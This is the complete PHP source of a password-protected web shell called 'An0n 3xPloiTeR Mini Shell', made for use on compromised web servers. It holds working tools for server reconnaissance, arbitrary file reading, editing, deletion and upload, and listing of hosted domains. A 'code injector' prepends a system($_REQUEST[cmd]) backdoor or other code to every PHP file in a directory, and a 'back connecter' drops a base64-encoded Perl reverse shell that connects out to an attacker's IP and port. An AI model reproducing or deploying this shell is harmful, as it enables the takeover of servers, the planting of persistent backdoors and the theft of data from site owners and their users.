<?php
$auth_pass= "92deb3f274aaee236194c05729bfa443"; // Password in MD5
// Default pass is password=umar
function An0n3xPloiTeRlogin() {
    die ('<!DOCTYPE html>
<html>
    <head>
        <title>An0n 3xPloiTeR Mini Shell</title>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
        <meta name="description" content="Sites description">
        <meta name="about" content="Made By An0n 3xPloiTeR">
        <link href="http://i66.tinypic.com/2j33a85.jpg" rel="Shortcut Icon" />
        <meta name="description" content="For Logging into the system">
        <style>
            .body {
                margin-top: 7vh;
                text-transform: capitalize;             
                background: black url("http://i66.tinypic.com/2j33a85.jpg");
                background-repeat:no-repeat;
                background-position: center;
                background-attachment: fixed;
                -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
            }
            .font {
                font-family: calibri;
                font-size: 300%;
                text-align: center;
                color: white;
            }
            .upass {
                margin-top: 70vh;
                font-family: calibri;
                font-size: 100%;
                text-align: center;
                color: black;
            }
            .input {
                margin:0;background-color:black;border:1px solid black; 
            }
        </style>
        <script language="JavaScript1.2">
            function ejs_nodroit(){
                alert("Login Please!");
                return(false);
            }
            document.oncontextmenu = ejs_nodroit;
        </script>
    </head>

    <body class="body">
        <div class="font">
            <font>login Page</font><br>
        </div>
        <div class="upass">
            <form method=post>
            <input class="input" type="password" name="pass" size="25"/>
            </form>
        </div>
    </body>
</html>');
}

function An0n3xPloiTeRsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) {
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    }

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass)) {
        An0n3xPloiTeRLogin();
    } }
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Mini Shell By An0n 3xPloiTeR</title>
		<meta charset="UTF-8" />
		<meta name="description" content="This Mini Shell is Designed By An0n 3xPloiTeR" />
		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
		<meta name="about" content="Use it where other shells dont work" />
        <meta name="author" content="An0n 3xPloiTeR,Umar Arfeen Shah" />
        <meta name="keywords" content="An0n 3xPloiTeR,Mini Shell,Mini,Shell,An0n,3xPloiTeR,Mini Shell By An0n 3xPloiTeR,Mini Shell" />
		<meta name="revisit-after" content="1800" />
		<meta name="language" content="en" />
		<meta content='general' name='rating' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
		<meta content='pakistan' name='geo.placename' />
		<meta content="index,follow,all" name="googlebot" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<link rel="SHORTCUT ICON" href="http://i.imgur.com/Ix3lhWm.jpg" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<style>
			body {
				background-color: black;
			}
			.heading {
				text-align: center;
				font-size: 300%;
				font-family: cursive;
				color: red;
			}
			.buttons {
				margin-top: 2vh;
			}
			input {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
				font-size: 110%;
			}
			select {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black;
			}
			option {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			textarea {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black; 
			}
			a {
				text-decoration: none;
				color: white;
			}
			a:hover {
				text-decoration: none;
				color: teal;
			}
			.footer {
				position: fixed;
				left: 0px;
				right: 0px;
				bottom: 1vh;
				color: red;
				font-family: cursive;
				font-size: 160%;
				text-align: center;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>An0n 3xPloiTeR Mini Shell</font><br>
		</div>
		<div class="buttons"><center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?die">
				<input type="submit" value="Die" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			</center>
			<?php
					if (isset($_GET['server_info'])) {
					?>
						<center><br><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Uname: <?php echo php_uname(); ?></font><br>
						<font style="color: silver; font-family: cursive; font-size: 130%;">Browser: <?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> </font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">User IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">User: <?php echo @get_current_user(); ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Safe Mode:&nbsp;<?php $safe_mode = ini_get('safe_mode'); if ($safe_mode == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?>
						</font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Domains: <?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$os = 'win';}else {$os = 'nix';}if($os == 'nix') {$dominios = @file_get_contents("/etc/named.conf");if(!$dominios) {$DomainS = "/var/named";$Domainonserver = scandir($DomainS);$d0c = count($Domainonserver);} else {@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out = sizeof(array_unique($out[1])); $d0c = $out."  Domains";}} else {$d0c = "1";} echo $d0c; }?>
					</center></font></center>
			<?php
			if (isset($_GET['file_manager'])) {
				echo '<!DOCTYPE HTML>
						<HTML>
						<HEAD>
						<link href="" rel="stylesheet" type="text/css">
						<title>An0n 3xPloiTeR File Manager</title>
						<style>
						body{
						    color: white;
						    font-family: "Racing Sans One", cursive;
						    background-color: black;
						    text-shadow:0px 0px 1px black;
						}
						#content tr:hover{
						    background-color: white;
						    text-shadow:0px 0px 10px white;
						}
						#content .first{
						    background-color: silver;
						}
						#content .first:hover{
						    background-color: silver;
						    text-shadow:0px 0px 1px #757575;
						}
						table{
						    border: 1px white dotted;
						}
						H1{
						    font-family: "Rye", cursive;
						    color: white;
						}
						a{
						    color: white;
						    text-decoration: none;
						}
						a:hover{
						    color: red;
						    text-shadow:0px 0px 10px #ffffff;
						}
						pre {
							color: white;
							font-family: cursive;
							font-size: 100%;
						}
						input,select,textarea{
										color: white;
										text-align: center;
										font-weight: bold; 
										font-family: cursive;
										border-left: black;
										border-right: black;
										border-style: groove;
										background-color: black; 
										font-size: 110%;
						}
						</style>
						</HEAD>
						<BODY>
						<H1><center>An0n 3xPloiTeR File Manager</center></H1>
						<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						<tr><td><font style="color:white;">Current Path : ';
						$path = getcwd();
						$path = str_replace('\\','/',$path);
						$paths = explode('/',$path);

						function permsa($file){
						$permsa = fileperms($file);

						if (($permsa & 0xC000) == 0xC000) {
						// Socket
						$ainfo = 's';
						} elseif (($permsa & 0xA000) == 0xA000) {
						// Symbolic Link
						$ainfo = 'l';
						} elseif (($permsa & 0x8000) == 0x8000) {
						// Regular
						$ainfo = '-';
						} elseif (($permsa & 0x6000) == 0x6000) {
						// Block special
						$ainfo = 'b';
						} elseif (($permsa & 0x4000) == 0x4000) {
						// Directory
						$ainfo = 'd';
						} elseif (($permsa & 0x2000) == 0x2000) {
						// Character special
						$ainfo = 'c';
						} elseif (($permsa & 0x1000) == 0x1000) {
						// FIFO pipe
						$ainfo = 'p';
						} else {
						// Unknown
						$ainfo = 'u';
						}

						// Owner
						$ainfo .= (($permsa & 0x0100) ? 'r' : '-');
						$ainfo .= (($permsa & 0x0080) ? 'w' : '-');
						$ainfo .= (($permsa & 0x0040) ?
						(($permsa & 0x0800) ? 's' : 'x' ) :
						(($permsa & 0x0800) ? 'S' : '-'));

						// Group
						$ainfo .= (($permsa & 0x0020) ? 'r' : '-');
						$ainfo .= (($permsa & 0x0010) ? 'w' : '-');
						$ainfo .= (($permsa & 0x0008) ?
						(($permsa & 0x0400) ? 's' : 'x' ) :
						(($permsa & 0x0400) ? 'S' : '-'));

						// World
						$ainfo .= (($permsa & 0x0004) ? 'r' : '-');
						$ainfo .= (($permsa & 0x0002) ? 'w' : '-');
						$ainfo .= (($permsa & 0x0001) ?
						(($permsa & 0x0200) ? 't' : 'x' ) :
						(($permsa & 0x0200) ? 'T' : '-'));

						return $ainfo;
						}

						foreach($paths as $id=>$pat){
						    if($pat == '' && $id == 0){
						        $a = true;
						        echo '<a href="?file_manager&path=/">/</a>';
						        continue;
						    }
						    if($pat == '') continue;
						    echo '<a href="?file_manager&path=';
						    for($i=0;$i<=$id;$i++){
						        echo "$paths[$i]";
						        if($i != $id) echo "/";
						    }
						    echo '">'.$pat.'</a>/';
						}
						echo '</td></tr><tr><td>';
						 if(isset($_GET['filesrc'])){
						    echo "<tr><td>Current File : ";
						    echo $_GET['filesrc'];
						    echo '</tr></td></table><br />';
						    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
						}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
						    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
						    if($_POST['opt'] == 'chmod'){
						        if(isset($_POST['perm'])){
						            if(chmod($_POST['path'],$_POST['perm'])){
						                echo '<font color="green">Change Permission Done.</font><br />';
						            }else{
						                echo '<font color="red">Change Permission Error.</font><br />';
						            }
						        }
						        echo '<form method="POST">
						        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="chmod">
						        <input type="submit" value="Go" />
						        </form>';
						    }elseif($_POST['opt'] == 'rename'){
						        if(isset($_POST['newname'])){
						            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
						                echo '<font color="green">Change Name Done.</font><br />';
						            }else{
						                echo '<font color="red">Change Name Error.</font><br />';
						            }
						            $_POST['name'] = $_POST['newname'];
						        }
						        echo '<form method="POST">
						        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="rename">
						        <input type="submit" value="Go" />
						        </form>';
						    }elseif($_POST['opt'] == 'edit'){
						        if(isset($_POST['src'])){
						            $fp = fopen($_POST['path'],'w');
						            if(fwrite($fp,$_POST['src'])){
						                echo '<font color="green">Edit File Done.</font><br />';
						            }else{
						                echo '<font color="red">Edit File Error.</font><br />';
						            }
						            fclose($fp);
						        }
						        echo '<form method="POST">
						        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="edit">
						        <input type="submit" value="Go" />
						        </form>';
						    }
						    echo '</center>';
						}else{
						    echo '</table><br /><center>';
						    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
						        if($_POST['type'] == 'dir'){
						            if(rmdir($_POST['path'])){
						                echo '<font color="green">Delete Dir Done.</font><br />';
						            }else{
						                echo '<font color="red">Delete Dir Error.</font><br />';
						            }
						        }elseif($_POST['type'] == 'file'){
						            if(unlink($_POST['path'])){
						                echo '<font color="green">Delete File Done.</font><br />';
						            }else{
						                echo '<font color="red">Delete File Error.</font><br />';
						            }
						        }
						    }
						    echo '</center>';
						    $scandir = scandir($path);
						    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						    <tr class="first">
						        <td><center>Name</center></td>
						        <td><center>Size</center></td>
						        <td><center>Permissions</center></td>
						        <td><center>Options</center></td>
						    </tr>';

						    foreach($scandir as $dir){
						        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
						        echo "<tr>
						        <td><a href=\"?file_manager&path=$path/$dir\">$dir</a></td>
						        <td><center>--</center></td>
						        <td><center>";
						        if(is_writable("$path/$dir")) echo '<font color="green">';
						        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
						        echo permsa("$path/$dir");
						        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
						        
						        echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$path\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"dir\">
						        <input type=\"hidden\" name=\"name\" value=\"$dir\">
						        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>";
						    }
						    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
						    foreach($scandir as $file){
						        if(!is_file("$path/$file")) continue;
						        $size = filesize("$path/$file")/1024;
						        $size = round($size,3);
						        if($size >= 1024){
						            $size = round($size/1024,2).' MB';
						        }else{
						            $size = $size.' KB';
						        }

						        echo "<tr>
						        <td><a href=\"?file_manager&filesrc=$path/$file&path=$path\">$file</a></td>
						        <td><center>".$size."</center></td>
						        <td><center>";
						        if(is_writable("$path/$file")) echo '<font color="green">';
						        elseif(!is_readable("$path/$file")) echo '<font color="red">';
						        echo permsa("$path/$file");
						        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
						        echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$path\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        <option value=\"edit\">Edit</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"file\">
						        <input type=\"hidden\" name=\"name\" value=\"$file\">
						        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>";
						    }
						    echo '</table>
						    </div>';
						}
						echo '
						</BODY>
						</HTML>';
						}
			?>
			<?php
				if (isset($_GET['php_info'])) {
						?>
					<body style="color: black; background-color: black;">
					<font style="background-color: black; color: black;">
					<?php phpinfo();}?>
					<?php 
			?>
			<?php
				if (isset($_GET['file_creator'])) {
					?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
						$filename_in_file_creator = $_POST['file_name'];
						$contents_of_file = $_POST['content_of_files'];

					if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {
						if (!empty($filename_in_file_creator) || !empty($contents_of_file)) {
						$handle = @fopen($filename_in_file_creator, 'w');
						@fwrite($handle, $contents_of_file);
						@fclose($handle);
						?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $filename_in_file_creator; ?>" target="_blank"><?php echo $filename_in_file_creator; ?></a> is created</font>
						<?php 
						} else {
							?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
							<?php
								}
							}
						}
					?>
					<?php
						if (isset($_GET['mass_injector'])) {
							?><br><center><br>
							<font style="color: teal; font-family: cursive; font-size: 200%;">ReV Mass Code Injector V2.0</font><br><br>
							<form action="" method="POST">
			<?php
				$console = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';
			?>
				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $console; ?>"></textarea><br><br>
				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
			</form>
			<?php
				if (isset($_POST['submit'])) {
					$code = $_POST['code'];
					$code1 = base64_encode($code);
					$path = getcwd();
					$host = 'http://'.$_SERVER['HTTP_HOST'];
					$path_of_file = $_SERVER['SCRIPT_NAME'];
					$website_testing = $host.$path_of_file;
					$path = getcwd();
					$directory = $path;

					if (empty($code)) {
						echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
					}

					if (!empty($code)) {

							if ($handle = opendir($directory)) {
							echo 'Website: '.$website_testing.'<br><br>';
							echo 'Looking in '.$directory.'<br>';
							while ($files = readdir($handle)) {
								if ($files != '.' && $files != '..' && $files != 'rev.php' && $files != 'REV.php' && $files != '.htaccess' && $files != 'php.ini' && $files != 'admin' && $files != 'images' && $files != 'image' && $files != 'img' && $files != 'phpmyadmin' && $files != 'files' && $files != '.ftpquota' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'xml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'png' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'jpeg' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'txt' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'exe' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'html' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'shtml' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'htm' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'ico' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'css' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'zip' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'sql' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'js' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'py' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'pl' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'md' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'gif' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'tar.gz' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'c' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'sql.zip' && strtolower(substr($files, strrpos($files, '.') + 1)) != 'out') {
								echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
								$file_data = base64_decode($code1);
								$file_data .= file_get_contents($files);
								file_put_contents($files, $file_data);
								} 
							}
						}
					}
				}
			}
		?>
		<?php
			if (isset($_GET['uploader'])) {
				?>
				<center><br><br>
				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">An0n 3xPloiTeR's Uploader</font><br><br><br><br>
				<form method="POST" enctype="multipart/form-data" action="">
					<input style="font-size: 90%;" type="file" name="files">
					<input style="font-size: 90%;" type=submit value="Upload">
				</form>
				<?php
				$files = @$_FILES["files"];
				if ($files["name"] != '') {
				    $fullpath = $_REQUEST["path"] . $files["name"];
				    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
				        echo "<center><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
				    }
				}
				?>
				<?php
			}
		?>
		<?php
		?>
		<font style="color: white; font-family: cursive; font-size: 100%;">
		<?php
			if (isset($_GET['domains'])) { 
				if(strtolower(substr(PHP_OS,0,3)) == "win") {
					$os = 'win';
					}	else {
							$os = 'nix';
					} 

					if ($os == 'win') {
					?>
				<center><br><br>
					<font style="color: white; font-family: cursive; font-size: 200%;">Ooopppss Windows Server :P<br>You Better Find Linux :P </font>
				</center><?php
			}
			else {
			if (isset($_GET['domains'])) {
				$file = @implode(@file("/etc/named.conf"));
				$Domain_path = "/var/named";
					if (!$file) {
					$domains = scandir($Domain_path);
					$count=1;
					$dc = 0;
					 echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2><center>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.</center></td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>";
					foreach ($domains as &$domain) {
					    if (stripos($domain,".db")) {
					    $domain = str_replace('.db','',$domain);

					    }
					    if (strlen($domain) > 6) {
					        
					        echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>User</td></tr>";
					    }
    				} 
 						echo "</table>";
					} else{
			        $count = 1;
			        preg_match_all("#named/(.*?).db#", $file, $r);
			        $domains = array_unique($r[1]);
                    echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2> There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>";
        			foreach ($domains as $domain) {
        			$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
        			echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>"; ?> </font> <?php
     				}
				}
			} } }
		?>
		<?php
			if (isset($_GET['back_connecter'])) {
				$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
				echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";			
				if(isset($_POST['backconnect'])) {
					function cf($f,$t) {
						$w = @fopen($f,"w") or @function_exists('file_put_contents');
						if($w){
							@fwrite($w,@base64_decode($t));
							@fclose($w);
					}
				}
				function An0n3xPloiTeR($in) {
					$out = '';
					if (function_exists('exec')) {
						@exec($in,$out);
						$out = @join("\n",$out);
					} elseif (function_exists('passthru')) {
						ob_start();
						@passthru($in);
						$out = ob_get_clean();
					} elseif (function_exists('system')) {
						ob_start();
						@system($in);
						$out = ob_get_clean();
					} elseif (function_exists('shell_exec')) {
						$out = shell_exec($in);
					} elseif (is_resource($f = @popen($in,"r"))) {
						$out = "";
						while(!@feof($f))
							$out .= fread($f,1024);
						pclose($f);
					}
					return $out;
				}

				if($_POST['backconnect']) {
					cf("/tmp/bc.pl",$back_connect_p);
					$out = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
            		sleep(1);
					echo "<pre class=ml1>$out\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>";
            		unlink("/tmp/bc.pl");
					}
				}
			}	
		?>
		<?php
			if (isset($_GET['die'])) {
				if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
			die('<!DOCTYPE html>
<html>
	<head>
		<title>An0n 3xPloiTeR Shell</title>
		<meta charset="UTF-8">
		<meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
		<meta name="description" content="Sites description">
		<meta name="about" content="Made By An0n 3xPloiTeR">
		<meta name="description" content="Bye Bye">
		<style>
			.body {
			}
			.font {
				font-family: cursive;
				font-size: 300%;
				text-align: center;
				color: white;
			}
		</style>
		<script language="JavaScript1.2">
			function ejs_nodroit(){
				alert("Shell Site Again Bitch!");
				return(false);
			}
			document.oncontextmenu = ejs_nodroit;
		</script>
	</head>

	<body class="body">
		<div class="font">
			<font><br><br>You Deleted Me :3<br>Now Fuck off :V</font>
		</div>
	</body>
</html>'); } ?>
					</span>
				</center>
				<?php
			}
		?>
		</div>
		<div class="footer">
			<font>Developed By <a href="https://www.google.com/search?q=An0n 3xPloiTeR">An0n 3xPloiTeR</a></font>
		</div>
	</body>
</html>